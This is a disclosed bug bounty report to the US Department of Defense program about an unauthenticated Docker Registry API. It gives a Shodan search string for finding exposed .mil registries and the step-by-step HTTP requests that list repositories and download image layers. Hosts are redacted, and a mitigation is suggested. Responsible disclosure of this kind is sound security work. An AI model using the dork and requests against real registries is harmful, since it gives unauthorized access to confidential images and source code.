# Docker Registry without authentication leads to docker images download

## Report Details
- **Report ID**: 1989884
- **URL**: https://hackerone.com/reports/1989884
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2023-05-16T19:41:23.345Z
- **Disclosed**: 2023-06-23T18:17:25.337Z

## Reporter
- **Username**: samuelsiv
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
**Description:**
With the following shodan dork: 'ssl.cert.subject.cn:*.mil country:"US" http.status:200 product:"Docker Registry HTTP API"', you can see an exposed registry server under the CN "██████", which is unreachable from the domain, so I am reporting directly the IP address.

## References

https://dreamlab.net/en/blog/post/abusing-exposed-docker-registry-apis/
https://docs.docker.com/registry/spec/api/

## Impact

An attacker can download Docker images and read the source code of probably confidential tools.

## System Host(s)
████████

## Affected Product(s) and Version(s)
Docker Registry HTTP API v2

## CVE Numbers


## Steps to Reproduce
To get a list of the repositories on the API send the following request:
```
> GET /v2/_catalog HTTP/1.1
> Host: ████
> Accept: */*
```

This will return a few repositories hosted on the website.
To get any of the repositories files, you will first need to obtain the tag, so you can download the manifest file.
For example, we will choose the repo "█████████/█████████".
Let's send the following request:
```
> GET /v2/████████/██████/tags/list HTTP/1.1
> Host: █████████
> Accept: */*
```
This will give us a json body, which contains the tag we want to download the manifest from, in this case we will have "3.0.1"

Then, to obtain the manifest just send the following request:
```
> GET /v2/████████/█████/manifests/3.0.1 HTTP/1.1
> Host: █████████
> Accept: */*
```

Then, just pick any "blobSum" value from the "fsLayers" array from the response we just received with the previous request and send the following request:
For example I will now pick: "█████████"

```
> GET /v2/█████████/██████/blobs/████ HTTP/1.1
> Host: ████████
> Accept: */*
```

This will make you download a file, which is a .tar.gz archive, and there will be parts of the repo you are downloading.

## Suggested Mitigation/Remediation Actions
Implement access control on the registry or do not expose this API unless strictly necessary.



## Attachments
No attachments
